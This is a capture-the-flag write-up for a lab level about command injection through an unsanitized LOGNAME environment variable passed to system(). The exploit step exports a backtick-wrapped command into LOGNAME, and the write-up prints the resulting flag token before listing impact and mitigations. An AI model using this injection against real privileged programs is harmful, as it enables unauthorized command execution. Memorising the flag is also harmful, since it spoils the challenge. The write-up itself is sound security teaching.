# Level07: Environment Variable Command Injection

## Description
This level demonstrates command injection through unsanitized environment variables. The binary reads the `LOGNAME` environment variable and passes it directly to a `system()` call with `/bin/echo`, allowing arbitrary command execution through shell metacharacters.

## Discovery Process

1. **Initial reconnaissance:**
   ```bash
   ls -la
   # Found: level07 (executable)
   ```

2. **Analyzed the binary:**
   ```bash
   strings level07
   ```
   - Key findings:
   ```
   LOGNAME
   /bin/echo %s
   getenv
   system
   ```
   - The program uses `getenv("LOGNAME")` and formats it into `/bin/echo %s`
   - The result is executed via `system()` without sanitization

## Steps to Exploit

1. **Inject command via environment variable:**
   ```bash
   export LOGNAME='`getflag`'
   ./level07
   ```
   - Output:
   ```
   Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
   ```
   - Flag: `fiumuikeil55xe9cu4dood66h`



## Impact
- Environment variables passed to `system()` without sanitization enable command injection
- Attackers can execute arbitrary commands with the binary's elevated privileges
- Any shell metacharacters (backticks, semicolons, pipes) can be exploited

## Mitigation
1. **Never use `system()` with user-controllable input:** Use `execve()` with argument arrays instead
2. **Sanitize environment variables:** Clear or validate all environment data before use
3. **Use safe alternatives:** Prefer `execve()`, `execvp()` with explicit arguments